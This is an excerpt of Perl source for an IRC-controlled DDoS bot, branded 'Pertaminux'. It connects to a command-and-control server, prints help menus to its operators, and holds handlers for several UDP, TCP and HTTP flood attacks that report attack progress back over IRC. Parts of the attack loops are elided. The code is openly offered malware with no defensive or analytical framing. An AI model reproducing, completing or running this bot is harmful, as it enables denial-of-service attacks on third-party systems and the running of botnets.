...
######################################################################################################################
######################################################################################################################
##  DDoS Perl IrcBot v1.0 / 2016 modded by  Pertaminux	       ## [ Help ] #########################################
...
## my @rrealname = ("4,1[ #Pertaminux Corp ]",
...
my $server = 'connect.pertaminux.org';
my $port = '8089';
my $linas_max='8';
my $sleep='5';
my $homedir = "/tmp";
...
if ($funcarg =~ /^help/) {
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Pertaminux PerlBot Main Help:  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
...
if ($funcarg =~ /^flood/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Pertaminux PerlBot Flood Help: ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
...
if ($funcarg =~ /^channel/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Pertaminux PerlBot Channel Help:     ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
...
if ($funcarg =~ /^utils/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Pertaminux PerlBot Utils Help:                            ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
...
if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
    ...
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 Pertaminux] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
   while (($pacota == "1") && ($pacotes == "1")) {
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 Pertaminux] 9,1Attack for 12".$1." 9,1finished in 12".$dtime." 9,1seconds9,1. ");
}
##############
if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 Pertaminux] 9,1Attacking 12".$1." 9,1with 12".$2." 9,1Kb Packets for 12".$3." 9,1seconds. ");
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 Pertaminux] 9,1Results 12".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
}
##############
if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    ...
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 Pertaminux] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 Pertaminux] 9,1Results 12".$pacotese." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
}
##############
 
##############
if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [TCP Pertaminux] 9,1Attacking 12".$1.":".$2." 9,1for 12".$3." 9,1seconds. ");
    my $itime = time;
    my ($cur_time);
    $cur_time = time - $itime;
    while ($3>$cur_time){
    ...
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [TCP Pertaminux] 9,1Attack ended on: 12".$1.":".$2."9,1. ");
}
##############
if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[HTTP Pertaminux] 9,1Attacking 12".$1." 9,1on port 80 for 12".$2." 9,1seconds. ");
    my $itime = time;
    my ($cur_time);
    $cur_time = time - $itime;
    while ($2>$cur_time){
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [HTTP Pertaminux] 9,1Attacking ended on: 12".$1."9,1. ");
}
##############
